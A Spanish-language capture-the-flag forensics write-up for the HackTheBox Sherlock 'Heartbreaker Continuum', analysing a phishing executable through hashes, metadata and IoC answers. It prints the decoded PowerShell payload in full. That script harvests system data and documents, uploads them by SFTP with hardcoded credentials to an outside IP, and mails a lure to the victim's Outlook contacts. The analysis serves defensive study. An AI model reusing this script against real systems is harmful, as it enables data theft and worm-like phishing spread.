---
title: Heartbreaker Continuum
description: >
  HackTheBox Sherlock - Easy<br>
  [Challenge Download](https://app.hackthebox.com/challenges/423)
date: 2024-05-08
weight: 10
tags: ["htb","forensics","sherlock","easy", "wireshark"]
---

---
### Enunacido del problema

Following a recent report of a data breach at their company, the client submitted a potentially malicious executable file. The file originated from a link within a phishing email received by a victim user. Your objective is to analyze the binary to determine its functionality and possible consequences it may have on their network. By analyzing the functionality and potential consequences of this binary, you can gain valuable insights into the scope of the data breach and identify if it facilitated data exfiltration. Understanding the binary's capabilities will enable you to provide the client with a comprehensive report detailing the attack methodology, potential data at risk, and recommended mitigation steps.

---

###### 1  - To accurately reference and identify the suspicious binary, please provide its SHA256 hash.
```bash
$> sha256sum Superstar_MemberCard.tiff.exe

12daa34111bb54b3dcbad42305663e44e7e6c3842f015cccbbe6564d9dfd3ea3  Superstar_MemberCard.tiff.exe
```

###### 2 - When was the binary file originally created, according to its metadata (UTC)?
- 2024-03-13 10:38:06

Podemos encontrar esta linea en ida64:
```c
.idata:00402000 ; Timestamp   : 65F1820E (Wed Mar 13 10:38:06 2024)
```

###### 3 - Examining the code size in a binary file can give indications about its functionality. Could you specify the byte size of the code in this binary?
- 38400

El core size de exiftool:
```bash
ExifTool Version Number : 12.89 File Name : Superstar_MemberCard.tiff.exe Directory : . File Size : 41 kB File Modification Date/Time : 2024:05:14 01:02:36+02:00 File Access Date/Time : 2024:07:17 19:50:39+02:00 File Inode Change Date/Time : 2024:07:17 19:50:33+02:00 File Permissions : -rw-r--r-- File Type : Win32 EXE File Type Extension : exe MIME Type : application/octet-stream Machine Type : Intel 386 or later, and compatibles Time Stamp : 2024:03:13 11:38:06+01:00 Image File Characteristics : Executable, 32-bit PE Type : PE32 Linker Version : 11.0 

Code Size : 38400

Initialized Data Size : 2048 Uninitialized Data Size : 0 Entry Point : 0xb50e OS Version : 4.0 Image Version : 0.0 Subsystem Version : 4.0 Subsystem : Windows GUI File Version Number : 0.0.0.0 Product Version Number : 0.0.0.0 File Flags Mask : 0x003f File Flags : (none) File OS : Win32 Object File Type : Executable application File Subtype : 0 Language Code : Neutral Character Set : Unicode File Description : File Version : 0.0.0.0 Internal Name : Superstar_MemberCard.tiff.exe Legal Copyright : Original File Name : Superstar_MemberCard.tiff.exe Product Version : 0.0.0.0 Assembly Version : 0.0.0.0
```

###### 4 - It appears that the binary may have undergone a file conversion process. Could you determine its original filename?
- newILY.ps1
![](https://raw.githubusercontent.com/yoshlsec/page-images/main/Sherlocks%20HTB/Pasted%20image%2020240717204113.png)

Entrando con ida vemos un codigo en base64 raro que si hacemos un revert y lo pasamos nos da un código en powershell:

![](https://raw.githubusercontent.com/yoshlsec/page-images/main/Sherlocks%20HTB/Pasted%20image%2020240717201101.png)

###### 5 - Hexadeciaml

- 2c74
![](https://raw.githubusercontent.com/yoshlsec/page-images/main/Sherlocks%20HTB/Pasted%20image%2020240717232756.png)

```powershell
$hostname = $env:COMPUTERNAME
$currentUser = $env:USERNAME
$url = "http://44.206.187.144:9000/Superstar_MemberCard.tiff"
$img = "C:\users\$currentUser\Downloads\Superstar_MemberCard.tiff"

Invoke-WebRequest -Uri $url -OutFile $img
Start-Process $img

$searchDir = "C:\Users"
$targetDir = "C:\Users\Public\Public Files"

if (-not (Test-Path -Path $targetDir -PathType Container)) {
    New-Item -ItemType Directory -Path $targetDir -Force | Out-Null
}

$currentUser | Out-File -FilePath (Join-Path $targetDir 'username.txt') -Force

nltest /dsgetdc:$env:USERDOMAIN 2>$null | Out-File -FilePath (Join-Path $targetDir 'DCinfo.txt') -Force
Get-WmiObject -Class Win32_UserAccount | Out-File -FilePath (Join-Path $targetDir 'localusers.txt') -Force
wmic /NAMESPACE:\\root\SecurityCenter2 PATH AntiVirusProduct GET /value 2>$null | Out-File -FilePath (Join-Path $targetDir 'AVinfo.txt') -Force

$currentUserProcesses = Get-WmiObject Win32_Process | Where-Object {
    try {
        $_.GetOwner().User -eq $currentUser
    } catch {
        $false  
    }
}

$currentUserProcesses | Select-Object ProcessName, ProcessId | Out-File -FilePath (Join-Path $targetDir 'UserProcesses.txt') -Force

if (Get-Process -Name Outlook -ErrorAction SilentlyContinue) {
    Stop-Process -Name Outlook -Force -ErrorAction SilentlyContinue
}

$extList =  "*.doc", "*.docx", "*.xls", "*.xlsx", "*.ppt", "*.pptx", "*.pdf", "*.csv", ".*oft", "*.potx", 
            "*.xltx", "*.dotx", "*.msg", "*.eml", "*.pst",  "*.odt", "*.ods", "*.odp", "*.odg", "*.ost"
             
$null = Get-ChildItem $searchDir -Recurse -Include $extList -Force -ErrorAction 'SilentlyContinue' |
    ForEach-Object {
        $destinationPath = Join-Path $targetDir $_.Name
        
        if ($_.FullName -ne $destinationPath) {
            Copy-Item -Path $_.FullName -Destination $destinationPath -Force
        }
    }

Get-SmbShare | Out-File -FilePath (Join-Path $targetDir 'Shareinfo.txt') -Force
gpresult /r | Out-File -FilePath (Join-Path $targetDir 'GPinfo.txt') -Force
$ProgressPreference = 'SilentlyContinue'
$archivePath = "$targetDir\$hostname.zip"
Compress-Archive -Path $targetDir -DestinationPath $archivePath -Force 

$wZipUrl = "https://us.softradar.com/static/products/winscp-portable/distr/0/winscp-portable_softradar-com.zip"
$wZipFile = "$targetDir\WinSCP.zip"
$wExtractPath = "C:\Users\Public\HelpDesk-Tools"

Invoke-WebRequest -UserAgent "Wget" -Uri $wZipUrl -OutFile $wZipFile -UseBasicParsing
Expand-Archive -Path $wZipFile -DestinationPath $wExtractPath -Force

$wExePath = "$wExtractPath\WinSCP.com"
$sPath = "$wExtractPath\maintenanceScript.txt"
@"
open sftp://service:M8&C!i6KkmGL1-#@35.169.66.138/ -hostkey=*
put `"$archivePath`"
close
exit
"@ | Out-File -FilePath $sPath -Force
Start-Process -FilePath $wExePath -ArgumentList "/script=`"$sPath`"" -Wait -NoNewWindow


$outlookPath  = Get-ChildItem -Path "C:\Program Files\Microsoft Office" -Filter "OUTLOOK.EXE" -Recurse | Select-Object -First 1 -ExpandProperty FullName

$htmlBody = @"
<!DOCTYPE html>
<html>
<head>
<style>
    body {
    font-family: Calibri, sans-serif;
    }
</style>
</head>
<body>
<p>Hey, </p> <p> Hope you're doing great when you see this. I'm reaching out because there's something I've been wanting to share with you. You know that feeling when you've been admiring someone from afar, but hesitated to take the next step? That's been me lately, but I've decided it's time to change that.</p>
<p>In a world where we often rush through everything, I believe in the beauty of taking things slow, cherishing each moment like a scene from a timeless tale. So, if you're open to it, I'd love for us to meet up after hours.</p>
<p>I've arranged for a rendezvous at a private membership club, where we can enjoy a bit of privacy and exclusivity. I've attached the map for your convenience. </p>
<p>To gain entry, you'll need a digital membership card for entry, accessible <a href='http://44.206.187.144:9000/Superstar_MemberCard.tiff.exe'>here</a>. Just a friendly heads up, there's a time limit before you can download it, so it's best to grab it sooner rather than waiting too long.</p>
<p>Counting on seeing you there later.</p>
</body>
</html>
"@

if ($outlookPath) {
    Start-Process -FilePath $outlookPath
    $outlook = New-Object -ComObject Outlook.Application
    $namespace = $outlook.GetNamespace("MAPI")
    $contactsFolder = $namespace.GetDefaultFolder(10) 
    $csvFilePath = "$targetDir\Contacts.csv"
    $contactsFolder.Items | ForEach-Object {
        $_.GetInspector | ForEach-Object {
            $_.Close(0)  
        }
        $props = @{
            'Full Name'      = $_.FullName
            'Email Address'  = $_.Email1Address
            
        }
        New-Object PSObject -Property $props
    } | Export-Csv -Path $csvFilePath -NoTypeInformation

    $contacts = Import-Csv -Path $csvFilePath
    $mailItem = $outlook.CreateItem(0)
    $mailItem.Subject = "Fingers crossed you'll notice.."
    $mailItem.HtmlBody = $htmlBody
    $mailItem.Attachments.Add($img) > $null
    $mailItem.BodyFormat = 2 

    foreach ($contact in $contacts) {
        $bccRecipient = $mailItem.Recipients.Add($contact."Email Address")
        $bccRecipient.Type = [Microsoft.Office.Interop.Outlook.OlMailRecipientType]::olBCC
    }

    $mailItem.Recipients.ResolveAll() > $null
    $mailItem.Send()
}

Remove-Item -Path $wExtractPath -Recurse -Force
Remove-Item -Path $targetDir -Recurse -Force

```

De este código sacamos varias preguntas

###### 6 - The threat actor concealed the plaintext script within the binary. Can you provide the encoding method used for this obfuscation?
- Base64

###### 7 - What is the specific cmdlet utilized that was used to initiate file downloads?
- Invoke-WebRequest

###### 8 - Could you identify any possible network-related Indicators of Compromise (IoCs) after examining the code? Separate IPs by comma and in ascending order.
- 35.169.66.138,44.206.187.144

###### 9 - The binary created a staging directory. Can you specify the location of this directory where the harvested files are stored?
- C:\\Users\\Public\\Public Files

###### 10 - What MITRE ID corresponds to the technique used by the malicious binary to autonomously gather data?
- T1119

###### 11 - What is the password utilized to exfiltrate the collected files through the file transfer program within the binary?
- M8&C!i6KkmGL1-#